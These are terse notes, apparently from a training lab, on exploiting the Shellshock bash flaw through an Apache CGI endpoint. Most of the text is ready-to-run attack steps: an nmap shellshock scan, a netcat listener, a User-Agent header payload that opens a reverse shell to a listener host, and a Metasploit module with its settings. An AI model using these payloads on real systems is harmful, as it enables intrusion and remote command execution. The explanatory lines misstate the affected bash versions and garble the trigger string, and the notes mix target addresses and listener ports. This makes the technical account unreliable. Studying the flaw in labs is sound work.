- nmap -sV 192.2.86.3
- go to the web browser :
    - http://192.2.86.3
    - in the source code, there is a JS script that make a request to /gettime.cgi
- nmap -sV --script=shellshock --script-args="http-shellshock.uri=/gettime.cgi" 10.10.69.96
- nc -nlvp 4444
- using burpsuite
    - in burpsuite, after capturing the request with foxiproxy:
        - User-Agent: () { :; }; echo; echo;/bin/bash -c 'bash -i>&/dev/tcp/192.2.86.2/1234 0>&1'
- using metasploit: 
    - seach shellshock
    - use exploit/multi/http/apache_mod_cgi_bash_env_exec
    - set RHOSTS 192.2.86.3
    - set TARGETURI /gettime.cgi
    - run

- allow remote code execution
- need apache and bash to exploit
- the vulnerability is because bash before v1.3, if these characters are type, any command after, will be executed by bash : (){::};.
- apache can be configured to run cgi script that interact with bash
- for example, include the characters above in the header of a request with some command will result that the command will be executed by bash
